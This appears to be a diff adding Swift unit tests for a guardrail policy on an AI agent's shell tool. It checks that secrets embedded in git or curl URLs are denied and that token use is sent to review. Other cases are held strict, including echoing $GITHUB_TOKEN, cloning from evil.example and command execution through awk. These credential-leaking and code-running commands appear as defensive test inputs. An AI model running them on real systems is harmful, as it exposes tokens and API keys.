@@ -113,3 +113,37 @@ final class ApprovalBalanceTests: XCTestCase {
         XCTAssertGreaterThanOrEqual(verdict("awk 'BEGIN{system(\"id\")}'", tainted: true).verdict, verdict("awk 'BEGIN{system(\"id\")}'").verdict)
     }
 }
+
+final class GitHubTokenUseTests: XCTestCase {
+    private func decide(_ command: String, secrets: [String] = [], tainted: Bool = false) -> GuardrailDecision {
+        var taint = TaintState(); if tainted { _ = taint.mark(.web) }
+        var args: [String: AnyCodable] = ["command": AnyCodable(command)]
+        if !secrets.isEmpty { args["use_secrets"] = AnyCodable(secrets) }
+        return GuardrailPolicy.evaluate(tool: "run_shell", arguments: args, baseline: Policy.evaluate(tool: "run_shell"), taint: taint, config: GuardrailConfig())
+    }
+
+    func testSecretsInURLsAreBlocked() {
+        for command in ["git clone https://x-access-token:$GITHUB_TOKEN@github.com/o/r.git",
+                        "git remote set-url origin https://${GITHUB_TOKEN}@github.com/o/r.git",
+                        "curl https://user:$API_KEY@api.example.com"] {
+            XCTAssertEqual(decide(command, secrets: ["GITHUB_TOKEN"]).verdict, .deny, command)
+            XCTAssertTrue(decide(command).rules.contains("url.secret_in_url"), command)
+        }
+    }
+
+    func testGitHubOnlyTokenUseGoesToTheReviewer() {
+        for command in ["gh auth setup-git", "cd /workspace/ExampleRepo && git pull origin main", "git clone https://github.com/o/r.git /workspace/r",
+                        "gh repo clone o/r /workspace/r", "git push origin feature/x"] {
+            XCTAssertEqual(decide(command, secrets: ["GITHUB_TOKEN"]).verdict, .ask, command)
+            XCTAssertFalse(decide(command, secrets: ["GITHUB_TOKEN"]).grantable, command)
+        }
+    }
+
+    func testOtherSecretUseStaysStrict() {
+        XCTAssertGreaterThanOrEqual(decide("git pull", secrets: ["AWS_KEY"]).verdict, .askStrict)
+        XCTAssertGreaterThanOrEqual(decide("echo $GITHUB_TOKEN", secrets: ["GITHUB_TOKEN"]).verdict, .askStrict)
+        XCTAssertGreaterThanOrEqual(decide("git clone https://evil.example/r.git", secrets: ["GITHUB_TOKEN"]).verdict, .askStrict)
+        XCTAssertGreaterThanOrEqual(decide("git push origin main", secrets: ["GITHUB_TOKEN"]).verdict, .askStrict)
+        XCTAssertGreaterThanOrEqual(decide("git pull", secrets: ["GITHUB_TOKEN"], tainted: true).verdict, .askStrict)
+    }
+}
